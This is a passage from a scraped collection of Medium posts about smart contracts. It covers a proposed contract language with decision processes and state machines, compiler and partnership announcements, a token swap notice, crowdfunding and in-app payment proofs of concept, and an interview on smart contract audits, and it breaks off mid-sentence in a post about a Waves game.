too. And we should take a look at what those communities do, and not reinvent the wheel (a gentle hint at the formal methods booklet\u00a0:-)). More generally, this means that the development of (correct) contracts must also be supported by the overall toolchain. Here is how I envision this to work.Contract development should rely on a language stack. At the core of this stack, I expect a functional programming language. Functional languages are useful because they are (relatively) easy to verify, and can also relatively easily support (in-memory) transactions (as I have discussed in this previous post), which is useful for contract-style programs. On top of the functional core, I expect a couple of language extensions that directly support the above mentioned contract patterns, such as decisions, auctions, agreements and resource allocations. Each of those can be broken down into a whole range of configuration options (think: domain analysis, variability, feature model), that determine the specific behavior. The Executable Multi-Party Contract Language (EMPCL) in the above picture contains language constructs for these typical Smart Contract building blocks. It also support state machines, since most non-trivial contracts are in effect state machines. I will return to this idea below when we look at example code.On top of EMPCL, I see languages (or EMPCL-extensions) that are closely aligned with domains such as logistics or finance. Each of those has their own idiomatic contract constructs, and the language extensions should support those directly.Why language extensions and not just frameworks or libraries? Because they make it easier to write correct code (once they are stable). Two reasons. First, by using language constructs at an appropriate level of abstraction, many lower-level mistakes cannot be made in the first place. The contract is, to some degree, correct-by-construction. In addition, a language that makes semantically relevant things first-class citizens makes verification of the not-correct-by-construction things much easier (again, a hint at the formal methods booklet\u00a0:-)); good IDE support can also be provided more easily. It\u2019s also just less code one has to write, so it\u2019s easier to understand and review. Even better, by providing an interpreter, one can interactively play with the contracts and explore their behavior, and write test cases that are executed immediately. Finally, at least for those DSLs that are aligned with particular domains (those above EMPCL), there\u2019s a realistic chance that non-programmer domain experts can read or write the code. Really, this is the \u201cusual DSL story\u201d that has been proven to work over and over again, and it will also work here.Contracts also have a couple of very specific risks that go beyond functional safety-style verification that result from their game theoretic nature, for example sybil attacks or timing problems. For now, dealing with those is outside of what I am looking at.Prototypical ImplementationI have implemented some aspects of this language stack in MPS. In particular, I have started building a language that could become EMPCL. At this point I have not yet implemented verification tools, and I don\u2019t yet translate to any blockchain technology for execution. But some of the core abstractions are available, and this illustrates how and why they are useful. I will explain them in detail below. Make sure you have read the post on Dealing with Mutable State in KernelF, because I rely on it heavily.The Multi-Party Boolean\u00a0DecisionThe core abstraction I have implemented is the multi-party boolean decision, i.e., a process which lets a group of parties make a yes/no decision. It\u2019s the simplest process one can think of in the context of contracts. We had performed an initial domain analysis for decisions, and based on this, I have derived the following set of configuration options.First, who are the parties involved in making the decision. In the example above, bernd and markus are references to global variables of type party. Optionally, the set of parties can be dynamic, which means that, as the process executes, additional parties can be made members of the decision process. If the parties are dynamic, an additional check box shows up that allows support for sealing the parties: once the process is sealed, no new parties can be added anymore. The remaining options concern the actual decision process. The procedure determines how the final decision is made, e.g., by simple majority, by unanimous agreement or by a custom algorithm. The turnout determines whether a minimum number of parties have to actually make a decision. The time limit requires the decision to be made within a given timeframe, and the revokable flag determines whether a party can revoke their decision once they have made it.The decisions are an example of a process, i.e., a language construct that can be stimulated by executing commands, and it can be observed by reading values. Based on the configuration of the process, different commands and values are available. Since this is a language extension and not just a library, the IDE knows about these and can provide support, i.e., help ensure some degree of correctness by construction. A few examples are shown below.For example, once a turnout is configured, a non-vote cannot be interpreted as a \u201cno\u201d vote, so the system has to explicitly support voteFor and voteAgainst commands. Similarly, although not shown, the decision value is now an opt<boolean> instead of a boolean because, until the turnout has been achieved, no decision has been taken (and none is returned). Also, all the commands to add parties are only offered if dynamic is selected.Playing with Decisions\u200a\u2014\u200athe\u00a0REPLProcesses have this nice property of uniform interaction: send in commands, observe values. The KernelF Read-Eval-Print-Loop, or REPL, has special support for such values through the live() expression. Applied to a process (such as the MultipartyBooleanDecision), it provides code completion for the commands that are currently allowed. In fact, it even looks at the current state of the process and only supports those commands that are allowed at the current execution state. The REPL also supports a nice, readable rendering for the values of processes. For a sequence of steps, it even highlights the changes in blue, so it\u2019s easy to observe how a process evolved as users issue comm. The next screenshot shows a REPL session on a MultipartyBooleanDecision with a dynamic set of parties and sealing enabled. Check out how the internal state changes based on the commands issued.Because all of this is based on a generic, reflective API, one can imagine other UIs. In particular, we will build a \u201csimulator\u201d where there are buttons for each command and UI widgets for each value. This will allow non-programmers to creatively play with a contract and thus better understand how it behaves.Of course, one can also script tests and execute them directly in the IDE, based on the same interpreter that also drives the REPL.Combining Decisions with State\u00a0MachinesThe decision described above supports basic, multi-party decisions. Over time, we will also add support for auctions, agreements and other contract patterns. However, a contract will also always have specific behavior that cannot easily be expressed declaratively. However, there\u2019s no reason to \u201cfall down\u201d to imperative programming just yet. State machines are a much better abstraction for many of these behaviors, especially when combined with the processes. Consider the following set of requirements:We have a set of products, each can potentially be sold. First, apredefined group of stakeholders has to make a decision for each of theproducts whether it should indeed be sold or not. Everybody has to vote, and thedecision is by majority. There is a limited time by which the vote hasto have taken place. Once that decision has been made for all products,each products can be sold to somebody; a product can only be sold once,and the price must be the same or higher as the one specified in theoffer, and the offer must not have been sold before. All sales arerecorded. Once all sellable products have been successfully sold, thecontract terminates.This is a realistic, and not totally simplistic example of a contract. Let\u2019s look at its implementation based on declarative decision processes, state machines and a couple of helper functions. We also need a couple of data types; we start with those, they should be rather obvious:Next, we define a few helper functions, the comments in the code explain what they do.The remaining implementation consists of one decision process and a state machine (with a few more embedded functions). We show the code next, and then discuss it in some detail:The state machine serves as the \u201ctop level\u201d interface for the contract. Its API are the two events defined in it. The first one, vote, expresses that the party who votes for or against (expressed through the Boolean parameter) selling the product with the given ID. The second event, buy, expresses that a particular party wants to buy a product for a given price.The next line is crucial. Remember that we want to make a separate sell/no-sell decision for every product/offer. So the salesDecisions variable is initialized to a map that contains an instance of the ShouldWeSell process associated with each product ID.Let\u2019s now move on to the initial state decideOnSelling. If the vote event comes in, we react by checking whether the shouldWeSell flag is true. If so, we retrieve the sales decision process for the respective product and voteFor it. Otherwise we voteAgainst. If, for all sales decisions, the turnout has been achieved we transition to the selling state.In the selling state, we expect the buy event (any other event leads to a failure of the operation). If it comes in, and the decision to sell the particular product has been positive (check out the shouldBeSold function), we retrieve the box that contains the offer and call tryToBuy. Otherwise we ignore the event. Once all to-be-sold products have been sold, we move to the ended state.The final piece of the puzzle is the tryToBuy function. If the product/offer has already been sold it does nothing; otherwise it checks if the price paid by the buyer is greater or equal to the price stated in the offer, and if so, sets the offer\u2019s sold flag to true and adds the corresponding sale to the list of sales.Another ExampleThis final example is one where several decision processes interact and processes are started dynamically by the coordinating state machine. It\u2019s similar to the (in-)famous DAO in the sense that the set of decision makers changes dynamically. In particular, the requirements are:We\u2019re an online community that has to continuously maintain a (selling)decision; it can be revoked or granted over time. The group ofindividuals, called the deciders, can vote (and revoke) this salesdecision. The vote has to be unanimous. In addition, additional peoplecan be voted into the group of deciders. The existing deciders vote fornew candidates, by simple majority, but with a time limit. Once votedinto the group of deciders, the new member can participate in thesell/no-sell decision. Multiple member approval processes can go on atthe same time. While a member request is pending, the sales decision cannotbe changed.At the core are two decision processes. Sale runs \u201cforever\u201d and manages the group decision. It\u2019s membership can change over time. The other process, AccessControl, manages the join request and the voting for a potential new guy. It is started, dynamically, for each join request. The key is that whenever a join request for a new guy finishes successfully, it\u2019s join process is terminated, and the new guy is added to the parties of the Sale process. Check out the code, as well as the REPL session below.The REPL session is a bit longish, but it does illustrate the point.Wrap up and\u00a0OutlookIt should be obvious from these examples that the ability to declaratively specify contracts based on a mix of state machines and (a growing) set of declarative decision, auction, agreement and resource allocation processes provides a solid foundation for efficiently implementing Smart Contracts. Many low-level mistakes cannot be made, and stakeholders can experiment with the contract by playing with it in the REPL and a future simulator. Tests can be written an executed.It\u2019s probably worth mentioning that the whole contract, state machines and decision processes, are transactional (as discussed in that previous post). So if anything goes wrong (e.g., an event is posted when there is no transition that handles it), the machine fails and the transaction, if one has been started before, is rolled back.In the future, we will implement functional verification of contracts based on an integration with model checkers and SMT solvers; but don\u2019t expect a post that too soon, this is quite a bit of work.Finally, we also need a deployment story. We are working on a Java generator for KernelF and all the rest, so a plain Java (Enterprise) deployment is not too far away. We are also working on a generator to Ethereum to exploit its non-functional properties as well. But again, these things will take some time. My goal with this work, and this post, was to play with better abstractions for Smart Contracts; let me know if I succeeded.", "responses": ""}, {"title": "Ontology Neptune Released: Python Smart Contract Compiler for Developers", "author_name": "The Ontology Team", "link": "https://medium.com/ontologynetwork/ontology-neptune-released-python-smart-contract-compiler-for-developers-e4209f3b178b?source=search_post", "post_date": "Jan 8", "readtime": "3 min read", "upvotes": "392", "content": "Ontology Neptune Released: Python Smart Contract Compiler for DevelopersThe Ontology TeamBlockedUnblockFollowFollowingJan 8Ontology is dedicated to creating a collaborative open-source tech community. This requires constantly improving development tools and support to give developers easy access to decentralized technology.We are excited to announce the release of Ontology Neptune, the new Python Compiler, which includes more syntax features and precise syntax checking while maintaining Python semantics, enabling developers to harness the power of smart contracts.If you are a developer, make sure you have joined our Discord, there you can interact with Ontology core team developers and community developers. Also, take a look at the Developer Center on our website, there you can find developer tools, documentation, and more.You can find Ontology Neptune on our Github.Compiler featuresRewrite the compilation framework to implement a compilation process based on an abstract syntax tree.Keywords like break and continue are supported and can be used in any nested loop.Support for logical operations while keeping Python semantics.e.g. if a == 2 or (a == 5 and b == 4) or a == 3 and a == 7Support for keywords like while, for, and loop else.Support for in keyword. You can use a statement in the form of if a in list.Support to write as many statements as you like on a single line.Global variables can have dependency assignments.e.g. a = 10; b = aSupport for cascading comparisons while keeping Python semantics.e.g. if a < b < c < d >= e:a = 1Support for cascading assignments.e.g. a = b = c = 9Support for conditional expressions.e.g. c = a if x > 3 else bMap value content and nesting levels are unrestricted and can take many forms, such as list, map, function, and call.String slice supports string[\u00a0:], string[\u00a0: end], and string[start: ].Support for list comprehensions.Support for keyword assert.More strict function definition checks. Functions can be customized and imported, and any other function calls will report undefined errors. System calls and built-in functions both need to be imported.More syntax checking, such as number of function parameter, number mismatch, function redefinition and undefined variable, and so on. More precise syntax information for printing errors.For details of supported built-ins, please refer to builtins.py.Implement a series of commonly used library functionsint, str, bytes2hexstring, hexstring2bytes, bytearray_reverse, split, list_remove_elt, elt_inPlease see the function and implementation in libont.py.Will support dict\u2019s has_key, values, keys functions, and list remove function. Also, restore the semantics of global code (supports global writable variables, implementing cross-function shared variables).More in line with Python syntax, supporting more grammatical features.Compiler Design FrameworkStart with Compile Start and drive the entire build process with the Code Generate Driver. The decomposition of the process makes the code framework clearer and more logical, avoiding bugs in the version\u2019s iteration process.Analyze Python source code to get Abstract Syntax Tree (AST).Using AST, obtain the function declaration, process the imported module, and analyze the function classification features, including user-defined functions (user defined), library functions (lib), built-in functions (builtins), system calls (systemcall), entry functions (Main/main), and find regular syntax errors such as function redefinition.Translate Python global code.Determine the stack size of the function.Determine if the function has a return value. The Compiler specifies that the function with the return value must be assigned to a variable to avoid disrupting the stack structure.Compiled function bodyAll offsets can be determined only after all source code has been compiled. This version of the Compiler has reserved relocation space and corresponding label address, and the last step executes link work.Compile completed, print the instruction stream according to the option.", "responses": ""}, {"title": "IoTeX & CertiK Announce Partnership Focused on Blockchain and Smart Contract\u00a0Security", "author_name": "IoTeX", "link": "https://medium.com/iotex/iotex-certik-announce-partnership-focused-on-blockchain-and-smart-contract-security-954c422fca43?source=search_post", "post_date": "Jun 14, 2018", "readtime": "3 min read", "upvotes": "247", "content": "IoTeX & CertiK Announce Partnership Focused on Blockchain and Smart Contract\u00a0SecurityIoTeXBlockedUnblockFollowFollowingJun 14, 2018The decentralized and pseudo-anonymous nature of blockchain has the potential to fundamentally transform the world and how we interact with one another; however, with great promise also comes great risks from attacks by malicious actors. Just within the past couple weeks, hacks to exchanges (e.g., Coinrail) and to the smart contracts of various blockchain projects (e.g., BeautyChain) have increased skepticism and reminded us of the looming threat of hackers within the blockchain space. So what do we do from here?A good approach to tackling these such issues is to be both reactive and proactive. Reactive to learn from and address mistakes that others have made, and proactive to anticipate potential security threats that may arise. For IoTeX, a blockchain project building privacy-centric infrastructure for the Internet of Things (IoT), security of the user\u2019s tokens and data is a top priority\u200a\u2014\u200athis is why IoTeX has partnered with CertiK, a formal verification platform for smart contracts and blockchain ecosystems.How does CertiK verify platforms and smart contracts?CertiK is a blockchain and smart contract verification platform founded by top formal verification experts from Yale and Columbia University and former senior software engineers from Google, Facebook and FreeWheel. Different from the traditional testing approaches, CertiK attempts to mathematically prove blockchain ecosystem and smart contracts are hacker-resistant and bug-free. CertiK\u2019s key features include a layer-based decomposition approach, pluggable proof engine, machine-checkable proof objects, certified DApp libraries, and smart labelling.What is the purpose of the partnership?IoTeX\u2019s engineering team consists of Ph.Ds in Cryptography and Distributed Systems\u200a\u2014\u200aalthough they can be counted on to create bug-free smart contracts, IoTeX and any other project can benefit from CertiK\u2019s verification sign-off to have even greater assurance that their blockchain and smart contracts are hacker-resistant and bug-free. CertiK has verified the IOTX token contract, and IoTeX will continue to work with CertiK and other global project contributors to ensure their blockchain and smart contracts are truly secure.What can IoTeX and CertiK work on in the\u00a0future?One key challenge within the blockchain and security communities is achieving privacy-preserving computations in the form of smart contracts, which can be further formally verified autonomously. The partnership between IoTeX, an innovator in the lightweight privacy domain, and CertiK, a leader in formal verification and security of smart contracts, brings us one step closer on the long journey towards highly secure yet private smart contracts on public blockchains, including IoTeX blockchain.IoTeX looks forward to working with CertiK and other ecosystem members to combine strengths in cryptography and distributed systems to build blockchain ecosystems that are both prosperous and sustainable.About IoTeXIoTeX is the auto-scalable and privacy-centric blockchain infrastructure for the Internet of Things (IoT). IoTeX\u2019s global team is comprised of Ph.Ds in Cryptography, Distributed Systems, and Machine Learning, top tier engineers, and experienced ecosystem builders. IoTeX is developing innovations to push the frontier of blockchain 3.0, including the blockchains-in-blockchain architecture for heterogeneous computing, Roll-DPoS consensus with auto-scalability, and lightweight privacy-preserving techniques. IoTeX is bringing autonomous device coordination to the masses by \u201cconnecting the physical world, block by block.\u201dWebsite: https://iotex.io/Twitter: https://twitter.com/iotex_ioTelegram Announcement Channel: https://t.me/iotexchannelTelegram Group: https://t.me/IoTeXGroupMedium: https://medium.com/@iotexReddit: https://www.reddit.com/r/IoTeX/Join us: https://iotex.io/careers", "responses": ""}, {"title": "Etherparty Enhances Security Ahead of Rocket\u00a0Launch", "author_name": "Etherparty Smart Contracts, Inc.", "link": "https://blog.etherparty.com/etherparty-enhances-security-ahead-of-rocket-launch-1d6aa130b4be?source=search_post", "post_date": "Apr 10, 2018", "readtime": "2 min read", "upvotes": "411", "content": "Etherparty Enhances Security Ahead of Rocket\u00a0LaunchEtherparty Smart Contracts, Inc.BlockedUnblockFollowFollowingApr 10, 2018Etherparty Smart Contracts Inc. is a Vancouver blockchain technology company that builds full-fledged software solutions made for those who have little to no programming knowledge or experience.VANCOUVER, Canada\u200a\u2014\u200aEtherparty Smart Contracts Inc. (\u201cEtherparty\u201d), a blockchain technology company providing smart contract solutions for enterprise and everyday use on the world\u2019s most popular blockchains, has enlisted Zero Trust security solutions provider Aporeto, to provide an added layer of security to bolster the platform ahead of the ICO product launch.\u201cWe are excited to work with Etherparty to build Zero Trust security into their blockchain contract creation platform,\u201d said Jason Schmitt, CEO at Aporeto. \u201cFor the speed and agility necessary to thrive in the blockchain ecosystem, Etherparty is using a microservices architecture to rapidly respond to customer and market demands. Because they are taking security seriously and know that legacy security approaches fall short in the cloud-native world, they\u2019re partnering with Aporeto to prevent breaches and protect their applications and data.\u201dEtherparty is enabling a more connected and inclusive world by building easy-to-use, versatile and intuitive smart contract solutions. The crowdfunding application is the first product in a line of blockchain solutions to be deployed by the Vancouver-based technology company.\u201cWe wanted to ensure that users of Etherparty and its software products were provided the most secure operating environment and Aporeto\u2019s track record of experience spoke to their ability to help us achieve this,\u201d said Etherparty CEO, Kevin Hobbs. \u201cWe\u2019re truly excited about our blockchain platform\u2019s progress to date and are always looking to improve our technology to offer the best product experience in today\u2019s blockchain market.\u201dThe FUEL token is a transferable ERC-20 compliant digital token deployed on the Ethereum network and will serve as a method of validating a user\u2019s transactions on the Etherparty platform and its related products.For more information, visit etherparty.com and subscribe to the company mailing list. You can also join the Etherparty conversation via our community Telegram channel, or on Facebook, Twitter and BitcoinTalk.About EtherpartyEtherparty is a blockchain platform working to enable a connected and inclusive world by building easy-to-use, versatile and intuitive smart contract solutions. Visit: etherparty.com.About AporetoAporeto is a Zero Trust security solution for microservices, containers and the cloud that uses identity context, vulnerability data, threat monitoring and behavior analysis to build and enforce authentication, authorization and encryption policies for applications. For more information, check out www.aporeto.com or www.twitter.com/aporeto.Media Inquiries for Etherparty:Brandon KostinukCreative Director // Etherpartyb@etherparty.ioMedia Inquiries for Aporeto:Zora FalkowskiAccount Managerzfalkowski@shiftcomm.com", "responses": ""}, {"title": "Substratum Smart Contract Upgrade & Token\u00a0Swap", "author_name": "Substratum", "link": "https://medium.com/@SubstratumNet/substratum-smart-contract-upgrade-token-swap-fd9134027d24?source=search_post", "post_date": "Dec 18, 2018", "readtime": "2 min read", "upvotes": "260", "content": "Substratum Smart Contract Upgrade & Token\u00a0SwapSubstratumBlockedUnblockFollowFollowingDec 18, 2018On December 18th @ 8AM EST the Substratum Token Swap will take place. The new Smart Contract addresses several concerns as well as providing the framework for monetizing the network with release of Production Version 1 of SubstratumNode.Substratum Smart Contract Upgrade & Token\u00a0SwapYou can view the new Smart Contract at:Ethereum Accounts, Address And ContractsSource Code Copy Find Similiar Contracts pragma solidity 0.4.24; /** * @title Ownable * @dev The Ownable contract has\u2026etherscan.ioAnd the Quantstamp Audit Report is available at:Quantstamp AuditLauncherEdit descriptioncertificate.quantstamp.comToken Holders do not need to do anything special as the following process will ensure a fully automated migration from the old token to the new token:The old Substratum Smart Contract will freeze all wallets with tokens in themThe new Smart Contract will then begin processing each wallet and sending out the new tokensThe time this takes to process depends on the Ethereum network, at last count there were 31,337 wallets that need to be processed (*will be checked again at runtime); however, we will keep the community aware of progress as the process progresses.", "responses": "2"}, {"title": "Introducing Weifund: a smart-contract based crowdfunding platform", "author_name": "ConsenSys", "link": "https://media.consensys.net/consensys-announces-weifund-a-smart-contract-based-crowdfunding-platform-bba33d070699?source=search_post", "post_date": "Oct 5, 2015", "readtime": "4 min read", "upvotes": "17", "content": "Introducing Weifund: a smart-contract based crowdfunding platformConsenSysBlockedUnblockFollowFollowingOct 5, 2015WeiFund is a crowdfunding platform that leverages smart contracts. Founded and developed primarily by Nick Dodson, WeiFund is a spoke within the ConsenSys dApp ecosystem.Decentralized Crowdfunding: A New Frontier for Raising Capital in the 21\u00a0Century*Crowdfunding has changed the way organizations, groups and individuals have raised capital in the 21st century. In the past decade, conventional crowdfunding has positively impacted millions of worthwhile endeavors. However this movement is still in its infancy and new developments in decentralized technologies, specifically the blockchain, will initiate a new paradigm of capital raising and market-making in general. This post will cover conventional crowdfunding as it stands, and outline the future of its evolutionary counterpart\u200a\u2014\u200adecentralized crowdfunding\u200a\u2014\u200aand how Weifund is paving the path towards that future.Crowdfunding exemplifies a trend toward development of projects with customer and fan bases already defined. It resembles a swarm-like motion toward specific ideas or inventions that actual people desire, with collaboration and community building core to its ethos. Within the crowdfunding trend there is growing niche\u200a\u2014\u200adecentralized crowdfunding. What separates this niche is both technical and philosophical in nature.Conventional crowdfunding is centralized and resembles a traditional corporation. It provides a service, charges a fee, and acts as a middleman or matchmaker [1]. The critical difference in decentralized crowdfunding is that it will accomplish the connective matchmaking and initial service by replacing that corporation with software at a fraction of the cost it takes to run that traditional business. The technological stack it uses is uncensorable, unalterable and more secure than any possible combination of the technology previously available before it.Ethereum is an example of the underlying technology, which is a smart-contract ecosystem that will automate many intermediary business processes in a transparent and open manner [2]. For crowdfunding, the future will become so basic, simple, and clear, that this new philosophical paradigm will appear to materialize without much work at all. The bulk of the focus of business will shift from intermediaries to content creators, innovators, and a marketplace of participatory consumers.Using Ethereum, Nick was able to code a crowdfunding utility in under 150 lines of smart contract code. This fact is both a technological marvel and an important step toward a more free and democratic way to raise capital for projects, movements and ideas across the globe.WeiFund hopes to establish a beachhead in decentralized or web 3.0 crowdfunding. It intends to be ultimately supportive of campaigns and platforms in the space for years to come, by providing the initial code, interfacing and resources to make crowdfunding a fundamentally accessible and free utility for everyone.WeiFund is not just a crowdfunding utility for merely raising capital. It is extensible and modular so that other smart-contracts can interface interdependently with its core. For example, this will allow individuals to start equity crowdfunding campaigns where the headache of share issuance, management and ownership is a thing of the past. Think of receiving 1000 shares in a project you just contributed to, and within seconds trading those shares on a virtual exchange such as EtherEx. With this utility, we can collectively organize our ideas and resources efficiently\u00a0, outside of the baggage that has followed such economic behaviours in the history of investment.Campaigns operated on smart-contract ecosystems can be hyper-financed, where complex token or ledger systems can be instantaneously implemented in real-time, tremendously expanding the set of available options for investors, contributors and campaign operators [2]. WeiFund and similar decentralized crowdfunding platforms will leverage the inherent nature of smart contracts to open the front door of this technology. From here, we can begin to discuss what future we want to build for ourselves. While decentralized crowdfunding may at first only address a niche in consumer or organization market demand, it is possible that with increasing market demand, WeiFund or similar services could become the new standard for contractual crowdfunding.For more information, please visit our website http://weifund.io or follow us on twitter @WeiFund.Nick Dodson, Ashley Taylor, and the ConsenSys team@IAmNickDodson @ConsenSysLLCReferences & Footnotes:[1] \u201cThe Future of Finance: The Socialization of Finance\u201d available athttp://www.parksquare.com/uploads/insights/TheFutureofFinance_Part_3_03-13-15.pdf (last visited Oct 4, 2015)[2] Vitalik Buterin, \u201cA Next-Generation Smart Contract and Decentralized Application Platform,\u201d November, 2013, available athttps://github.com/ethereum/wiki/wiki/White-Paper (last visited Oct 4, 2015).[3] Oxfam, \u201cWealth: Having it all and Wanting More,\u201d January, 2015,available athttps://www.oxfam.org/sites/www.oxfam.org/files/file_attachments/ib-wealth-having-all-wanting-more-190115-en.pdf (last visited Oct 4, 2015).[4] Jed Cohen, \u201cThe Future Of Crowdfunding: What The Next 5 Years Will Bring\u201d Feb 20, 2015, available athttp://www.forbes.com/sites/theyec/2015/02/20/the-future-of-crowdfunding-what-the-next-5-years-will-bring/ (last visited Oct 4, 2015).[5] Jodi Helmer \u201c6 Trends That Are Shaping the Future of Crowdfunding\u201d August 14, 2015, available at http://www.entrepreneur.com/article/248122(last visited Oct 4, 2015).[6] \u201cThe Future of Crowdfunding\u201d (KPMG) September 23, 2014, available athttp://www.eban.org/wp-content/uploads/2014/09/23.-The-Future-of-Crowdfunding.pdf (last visited Oct 4, 2015).[7] Mor Assia \u201cFund Forward: 8 Exciting Trends in Crowdfunding That Are Coming Sooner Than You Think\u201d May 19, 2015, available athttp://www.crowdfundinsider.com/2015/05/68010-fund-forward-8-exciting-trends-in-crowdfunding-that-are-coming-sooner-than-you-think/ (last visited Oct 4, 2015).", "responses": "1"}, {"title": "AppCoins Protocol: Proof-of-Concept Smart\u00a0Contract", "author_name": "AppCoins Official", "link": "https://medium.com/@appcoins/appcoins-protocol-proof-of-concept-smart-contract-f50009a7cc13?source=search_post", "post_date": "Nov 27, 2017", "readtime": "4 min read", "upvotes": "410", "content": "AppCoins Protocol: Proof-of-Concept Smart\u00a0ContractAppCoins OfficialBlockedUnblockFollowFollowingNov 27, 2017TL;DR: We presented a PoC (proof-of-concept) during Web Summit to highlight the possibilities of the AppCoins protocol. The user would be able to perform an in-app purchase using APPC. The smart contract was deployed in the main network, making AppCoins the first app store related crypto project performing a transaction in the main network.IntroductionAppCoins is an open and distributed protocol for mobile app stores(GitHub). It will drastically improve and speed up advertising, in-app billing and app approvals, using blockchain and smart contracts technology. In this article, we are not going to focus on adversing nor app approval, the focus will be on in-app purchases.What we\u00a0didAs a PoC, we developed a sample app (GitHub) based on the Aptoide App Store (GitHub), which allows the users to purchase in-app items using AppCoins. The sample app uses the AppCoins lib, which can be found here.The sample app would call a smart contract running on the Ethereum\u2019s main net, which implements the token and the revenue share model proposed in the white paper.We are focusing this article on the smart contract. If you want to know more about the app part, please read this article.Smart ContractThe smart contract had some requirements it needed to meet:Create APPC dummy tokenProvide functionality to transfer tokensSplit token transfers according to our proposed revenue share model for the IAB use caseThe token was a dummy one in the sense that it didn\u2019t need to be ERC20 compliant and didn\u2019t need to be secure, since it was only going to be used by our PoC and wasn\u2019t going to be listed anywhere else.The revenue share model for the IAB use case states that for every itembought in an app, its developer is entitled to 85% of it, the app store to 10% and the OEM to 5%. The transfer function in the smart contract implements this logic, splitting the amount being transferred and sending each portion to the corresponding wallet.The smart contract used can be seen here. The method we introduced to perform a split was:Then it was used inside the transfer method:DeploymentDuring development and deployment, we relied on the development framework Truffle. It makes it easy to develop smart contracts and deploythem. It relies on a configuration file where the networks are defined (either local, test and main networks) and then the contracts are compiled and send to one of the configured networks. The reader can see from the linked configuration file that all the hosts point to localhost. That is because we had clients with both the Kovan test network and the main network already synced.For testing purposes, we did 2-step tests using a local network with TestRPC, and then the Kovan test network. Only when the smart contract had the required behaviour in both (first in the local network and then in Kovan), we deployed to the main network.As an example, to deploy to Kovan, we would use the command:truffle migrate --network kovanHowever, Truffle has a problem with the gas price when deploying to the main net, which makes transactions very costly in terms of gas. To solve that, we changed the gas and gasPrice default configurations to meet our needs.Next StepsAgain, this was a very simple PoC that served primarily for historical purposes. It\u2019s probable that the protocol won\u2019t rely on any of the code used for it.The technology we would like to get a grasp on next is \u00b5Raiden and integrate in an experiment close to the PoC because Raiden, although it\u2019s obviously different to \u00b5Raiden, can be an important component of the AppCoins protocol. We project that the protocol will have to support a significant amount of micro-transactions coming from mobile advertising and IAB, which means that pure on-chain solutions aren\u2019t suitable for it.", "responses": ""}, {"title": "Hosho\u200a\u2014\u200aSmart Contract\u00a0Audit", "author_name": "Norbert Gehrke", "link": "https://medium.com/tokyo-fintech/hosho-smart-contract-audit-6c81c7b8a96d?source=search_post", "post_date": "Jul 13, 2018", "readtime": "3 min read", "upvotes": "318", "content": "Hosho\u200a\u2014\u200aSmart Contract\u00a0AuditNorbert GehrkeBlockedUnblockFollowFollowingJul 13, 2018The quality standard for smart contracts: a Hosho\u00a0auditWe were privileged to have a long conversations with Hartej Sawhney, Co-Founder of Hosho, the world\u2019s premier smart contract audit company, during his recent visit to Tokyo. Hosho has been founded merely a year ago, and during this time have audited over 100 smart contracts, allowing them to build up an industry-leading knowledge base of vulnerabilities & best practices. Very often, Hosho is being engaged as a second or third audit firm, and identifies issues that have gone undetected before. They are also contracted by Big Four audit firms, when the consulting branches of these firms develop smart contracts, and the firms are prohibited from auditing themselves. In the process, \u201cHosho audited\u201d has become a quality seal in the industry, sought after by investors and exchanges.What is a smart contract\u00a0audit?A smart contract audit is a review of the code as well as the functionality of the code in regard to the white paper and/or other documentation. It also includes the complete writing of a test suite from scratch to near-100% coverage, and manual verification of any math, with the token issuance mechanism being a very large portion of that.In a typical smart contract audit, it will be ensured that the token contract:Implements and adheres to existing token standards appropriately and effectivelyDocumentation and code comments match logic and behaviorDistributes tokens in a manner that matches calculationsFollows best practices in efficient use of gas, without unnecessary wasteUses methods safe from re-entrance attacksIs not affected by the latest vulnerabilitiesThe Hosho smart contract audit\u00a0processThis is achieved through the following, mostly manual steps performed by various team members:Due diligence in assessing the overall code quality of the codebaseCross-comparison with other, similar smart contracts by industry leadersTesting contract logic against common and uncommon attack vectorsA thorough, manual review of the codebase, line-by-lineDeploying the smart contract to testnet and production networks using multiple client implementations to run live testsIt should be noted that the typical Hosho smart contract audit engagement includes a re-test of identified vulnerabilities once the client has been given a chance to fix them (phases #2 and #3 in the above schematic). Other firms might charge separately for this.Typical vulnerabilitiesNaturally, Hartej is full of anecdotes of vulnerabilities that his team has found. One that was very memorable concerned a smart contract that was structured so that it actually did not release any tokens to the founders\u200a\u2014\u200ano doubt that this founding team will think of the Hosho smart contract audit as money well spent.By now, given the emergence of \u201cHosho audited\u201d quality seal, many audit reports are made public to sooth investors. In fact, we see a smart contract audit listed as one of the deliverables in private sale fund raising documentation, so that the audit report can be used to attract a broader investor base during the public sale/ICO.Here are just a few other vulnerabilities that have been extracted from various public audit reports:Violation of purchasing limits of crowdsale participantsTotal supply of token is kept private (violation of ERC-20/ERC-223 standards)Incorrect addresses for sending tokensCrowdsale can be put on hold by any participantEstablishing an industry\u00a0standardHosho realizes that in this nascent and quickly evolving industry, standards are needed. Therefore, the company will bring major industry players together in Berlin shortly, with the goal of establishing a non-profit association that defines standards for smart contract audit. Every member of this association would commit to adhering to these standards, so that the results of different firms become much more comparable, and the bar for the industry as a whole is being raised.", "responses": "1"}, {"title": "New Smart Contract-Powered Game Launches on\u00a0Waves", "author_name": "Waves Platform", "link": "https://blog.wavesplatform.com/new-smart-contract-powered-game-launches-on-waves-dda2bc59e19c?source=search_post", "post_date": "Jan 23", "readtime": "2 min read", "upvotes": "247", "content": "New Smart Contract-Powered Game Launches on\u00a0WavesWaves PlatformBlockedUnblockFollowFollowingJan 23We are pleased to introduce a new game based on Waves smart contracts. It\u2019s very simple, but only the most patient player will win all the money\u2026The game creators from Tradisys have been inspired by cult movie The Fifth Element and have created a game on the theme of the film. The game is completely decentralised: there are no sources of external influence and it is controlled solely by the rules of a smart contract. It uses Waves Keeper to ensure the process is safe and secure: because your SEED is never exposed to the web, you\u2019re not trusting any third party with your funds.To take part, you need to transfer 1.1 WAVES to the smart contract of the game. Every time a participant enters the game, the countdown is reset and records a DataTransaction with the address of the last player\u2019s wallet on the blockchain.To win, the counter must reach zero\u200a\u2014\u200awith the last address to enter becoming the winner. If someone else sends a transaction and updates the counter, the previous player is eliminated. The wait duration for the counter is 60 blocks, which is approximately 60 minutes, though can be shorter or longer.To play you need:1. Desktop operating system (Windows, MacOs, Linux).2. The latest version of Google Chrome or Firefox.3. Waves Keeper installed (Chrome, FireFox).4. A minimum balance of 1.2 WAVES.Game instructions:1. Click the \u201cBuy ticket\u201d button.2. In the pop-up window, sign 2 transactions using Waves Keeper:- TransferTransaction (1.1 WAVES and 0.1 Commission)Then click NEXT- DataTransaction3. If the first two steps are carried out correctly, your payment will be recorded by the contract, and the counter at the top of the screen will be updated.4. The last player 